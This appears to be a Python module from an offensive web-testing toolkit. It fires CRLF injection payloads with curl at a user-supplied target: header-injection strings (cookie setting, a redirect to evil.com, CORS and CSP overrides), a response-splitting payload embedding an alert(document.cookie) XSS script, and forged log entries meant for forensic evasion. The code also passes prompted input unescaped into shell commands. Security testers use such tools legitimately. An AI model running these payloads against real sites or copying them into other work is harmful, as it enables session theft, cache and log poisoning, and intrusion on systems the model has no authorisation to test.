"""
modules/crlf_injection.py
tmrswrr - CRLF Injection / HTTP Response Splitting
Log injection, header injection, XSS via response split, cache poisoning
"""
import os
import urllib.parse

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def crlf_detect():
    section("CRLF INJECTION DETECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    canary = "X-CRLF-Test: YeepForge-CRLF-Injected"
    payloads = [
        f"\r\n{canary}",
        f"%0d%0a{canary.replace(' ', '%20')}",
        f"%0D%0A{canary.replace(' ', '%20')}",
        "%0d%0a%0d%0a<h1>Injected</h1>",
        "\r\n\r\n<h1>CRLF</h1>",
        f"\\r\\n{canary}",
        f"%E5%98%8A%E5%98%8D{canary.replace(' ', '%20')}",   # Unicode CRLF
        f"%0a%0d{canary.replace(' ', '%20')}",
    ]

    param = prompt("Parameter to inject CRLF into (e.g. lang, redirect, url, name)")
    if not param:
        param = "lang"

    info(f"Testing {len(payloads)} CRLF payloads via ?{param}=...")
    print()
    for p in payloads:
        test_url = f"{url}?{param}={p}"
        out, _, _ = run_cmd(
            f'curl -sk -D - -o - {cookie_flag} "{test_url}" -m 8 --max-redirs 0',
            timeout=10
        )
        if "x-crlf-test" in out.lower() or "yeepforge-crlf" in out.lower():
            success(f"CRLF CONFIRMED: {p[:60]}")
            success("Header injection achieved - response splitting possible!")
            add_vuln("CRLF Injection", "High", "A03:2021",
                     f"CRLF payload injected header: {p}", url)
        elif "<h1>CRLF</h1>" in out or "<h1>Injected</h1>" in out:
            success(f"CRLF confirmed via body injection: {p[:60]}")
            add_vuln("CRLF Injection (Response Splitting)", "High", "A03:2021",
                     f"HTTP response split via CRLF: {p}", url)
        else:
            print(f"  {DIM}[-] {p[:50]}{RST}")


def header_injection():
    section("HTTP HEADER INJECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Injecting malicious headers via CRLF in various locations...")
    param = prompt("Vulnerable parameter")
    if not param:
        return

    inject_headers = [
        ("Set-Cookie: malicious=injected; Path=/",    "Cookie injection"),
        ("Location: https://evil.com",                 "Redirect injection"),
        ("Content-Type: text/html",                    "Content-Type change"),
        ("X-Custom-Header: injected-value",            "Arbitrary header"),
        ("Access-Control-Allow-Origin: *",             "CORS bypass"),
        ("Content-Security-Policy: default-src *",     "CSP bypass"),
    ]

    for header, desc in inject_headers:
        payload = f"%0d%0a{urllib.parse.quote(header)}"
        test_url = f"{url}?{param}={payload}"
        out, _, _ = run_cmd(
            f'curl -sk -D - -o /dev/null {cookie_flag} "{test_url}" -m 8 --max-redirs 0'
        )
        header_name = header.split(":")[0].lower()
        if header_name in out.lower():
            success(f"HEADER INJECTION ({desc}): {header}")
            add_vuln(f"CRLF Header Injection: {desc}", "High", "A03:2021",
                     f"Injected: {header}", url)
        else:
            print(f"  {DIM}[-] {desc}{RST}")


def response_splitting_xss():
    section("RESPONSE SPLITTING → XSS")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    param = prompt("Vulnerable parameter")
    if not param:
        return

    # Craft a complete fake response
    xss_body = "<html><body><script>alert(document.cookie)</script></body></html>"
    fake_response = (
        "%0d%0a"
        "Content-Length: 0%0d%0a"
        "%0d%0a"
        "HTTP/1.1 200 OK%0d%0a"
        "Content-Type: text/html%0d%0a"
        f"Content-Length: {len(xss_body)}%0d%0a"
        "%0d%0a"
        f"{urllib.parse.quote(xss_body)}"
    )

    test_url = f"{url}?{param}={fake_response}"
    info("Sending response splitting payload with embedded XSS...")
    out, _, _ = run_cmd(
        f'curl -sk {cookie_flag} "{test_url}" -m 10', timeout=12
    )

    if "<script>" in out or "alert" in out:
        success("RESPONSE SPLITTING XSS CONFIRMED - script tag in response!")
        add_vuln("HTTP Response Splitting XSS", "Critical", "A03:2021",
                 "Full response splitting achieved with XSS payload", url)
    else:
        print(f"  Response preview: {out[:200]}")
        info("Manual verification in browser recommended")


def log_injection():
    section("LOG INJECTION VIA CRLF")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Injecting fake log entries via CRLF in headers and parameters...")
    timestamp = "2026-01-01 00:00:00"
    fake_entries = [
        f"\\r\\n{timestamp} - admin logged in from 127.0.0.1",
        "\\r\\n[INFO] Payment of $99999 processed successfully",
        "\\r\\n127.0.0.1 - admin - [01/Jan/2026:00:00:00] GET /admin 200",
        "\\r\\n[CRITICAL] Database backup completed",
    ]

    for entry in fake_entries:
        run_cmd(f'curl -sk -o /dev/null -H "User-Agent: Mozilla{entry}" {cookie_flag} {url} -m 5')
        print(f"  {NEON_CYN}[→]{RST} Log injection attempt: {entry[:60]}")

    info("Probes sent. If logs are accessible, check for injected entries.")
    info("Log paths to check: /var/log/nginx/, /var/log/apache2/, /app/logs/")
    info("Impact: forensic evasion, log file poisoning if parsed by tools (SIEM, Log4j)")


def run():
    print_banner("CRLF INJECTION / HTTP RESPONSE SPLITTING",
                 "Header Injection · Response Split XSS · Log Injection")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} CRLF Detection        {SOFT_WHITE}(8 payload variants){RST}
  {NEON_CYN}[2]{RST} HTTP Header Injection  {SOFT_WHITE}(Set-Cookie, Location, CSP, CORS){RST}
  {NEON_CYN}[3]{RST} Response Splitting XSS {SOFT_WHITE}(inject full HTTP response){RST}
  {NEON_CYN}[4]{RST} Log Injection          {SOFT_WHITE}(fake log entries via User-Agent){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": crlf_detect()
        elif c == "2": header_injection()
        elif c == "3": response_splitting_xss()
        elif c == "4": log_injection()
        save_session()
